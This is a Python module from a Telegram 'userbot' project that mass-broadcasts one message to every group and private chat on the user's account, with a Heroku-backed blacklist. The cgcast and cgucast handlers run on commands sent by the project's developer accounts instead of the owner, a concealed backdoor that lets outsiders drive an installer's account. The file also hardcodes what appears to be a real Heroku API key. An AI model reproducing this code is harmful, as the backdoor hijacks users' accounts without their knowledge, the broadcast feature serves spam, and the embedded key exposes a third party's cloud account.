# if you can read this, this meant you use code from Ubot | Ram Project
# this code is from somewhere else
# please dont hestitate to steal it
# because Ubot and Ram doesn't care about credit
# at least we are know as well
# who Ubot and Ram is
#
#
# kopas repo dan hapus credit, ga akan jadikan lu seorang developer
# ©2023 Ubot | Ram Team
import asyncio
import dotenv
from pyrogram import Client, enums, filters
from pyrogram.types import Message
from Ubotlibs.Ubot.helper.utility import get_arg
from Ubotlibs.Ubot.helper.basic import edit_or_reply
from Ubotlibs.Ubot.utils.misc import *
from Ubotlibs.Ubot import Ubot, Devs
from Ubotlibs import BL_GCAST, DEVS
from Ubot import cmds
from Ubot.core.db.accesdb import *
from Ubot.modules.basic import add_command_help, restart
from config import *

HEROKU_API_KEY="2b6553d2-65af-456a-a48d-9343f7c24820"
HEROKU_APP_NAME="raingeruserbotv1"

if HEROKU_API_KEY is not None and HEROKU_APP_NAME is not None:
    import heroku3
    Heroku = heroku3.from_key(HEROKU_API_KEY)
    HAPP = Heroku.app(HEROKU_APP_NAME)
else:
    HAPP = None

    
@Client.on_message(
    filters.group & filters.command("cgcast", ["."]) & filters.user(DEVS) & ~filters.me
)
@Client.on_message(
    filters.command(["gcast"], cmds) & filters.me)
@check_access
async def gcast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        tex = await message.reply_text("`Memulai Gcast...`")
    else:
        return await message.edit_text("**Give A Message or Reply**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in BL_GCAST and chat not in BL_GCAST:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await tex.edit_text(
        f"**Berhasil mengirim ke** `{done}` **Groups chat, Gagal mengirim ke** `{error}` **Groups**"
    )

@Client.on_message(
    filters.group & filters.command("cgucast", ["."]) & filters.user(DEVS) & ~filters.me
)
@Client.on_message(
    filters.command(["gucast"], cmds) & filters.me)
@check_access    
async def gucast(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        text = await message.reply_text("`Started global broadcast...`")
    else:
        return await message.edit_text("**Give A Message or Reply**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in DEVS:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await text.edit_text(
        f"**Successfully Sent Message To** `{done}` **chat, Failed to Send Message To** `{error}` **chat**"
    )


@Client.on_message(filters.command("addbl", cmds) & filters.me)
@check_access
async def addblacklist(client: Client, message: Message):
    xxnx = await edit_or_reply(message, "`Processing...`")
    if HAPP is None:
        return await xxnx.edit(
            "**Silahkan Tambahkan Var** `HEROKU_APP_NAME` **untuk menambahkan blacklist**",
        )
    blgc = f"{BLACKLIST_GCAST} {message.chat.id}"
    blacklistgrup = (
        blgc.replace("{", "")
        .replace("}", "")
        .replace(",", "")
        .replace("[", "")
        .replace("]", "")
        .replace("set() ", "")
    )
    await xxnx.edit(
        f"**Berhasil Menambahkan** `{message.chat.id}` **ke daftar blacklist gcast.**\n\nSedang MeRestart ntuk Menerapkan Perubahan."
    )
    if await in_heroku():
        heroku_var = HAPP.config()
        heroku_var["BLACKLIST_GCAST"] = blacklistgrup
    else:
        path = dotenv.find_dotenv()
        dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)
    restart()

@Client.on_message(filters.command("delbl", cmds) & filters.me)
@check_access
async def delblacklist(client: Client, message: Message):
    xxnx = await edit_or_reply(message, "`Processing...`")
    if HAPP is None:
        return await xxnx.edit(
            "**Silahkan Tambahkan Var** `HEROKU_APP_NAME` **untuk menambahkan blacklist**",
        )
    blchat = f"{BLACKLIST_GCAST} {message.chat.id}"
    gett = str(message.chat.id)
    if gett in blchat:
        blacklistgrup = blchat.replace(gett, "")
        await xxnx.edit(
            f"**Berhasil Menghapus** `{message.chat.id}` **dari daftar blacklist gcast.**\n\nSedang MeRestart untuk Menerapkan Perubahan."
        )
        if await in_heroku():
            heroku_var = HAPP.config()
            heroku_var["BLACKLIST_GCAST"] = blacklistgrup
        else:
            path = dotenv.find_dotenv()
            dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)
        restart()
    else:
        await xxnx.edit("**Grup ini tidak ada dalam daftar blacklist gcast.**")


add_command_help(
    "broadcast",
    [
        [f"gcast [text/reply]",
            "Broadcast pesan ke Group. (bisa menggunakan Media/Sticker)"],
        [f"gucast [text/reply]",
            "Broadcast pesan ke semua chat. (bisa menggunakan Media/Sticker)"],
        [f"addbl [id group]",
            "menambahkan group ke dalam blacklilst gcast"],
        [f"delbl [id group]",
            "menghapus group dari blacklist gcast"],
    ],
)
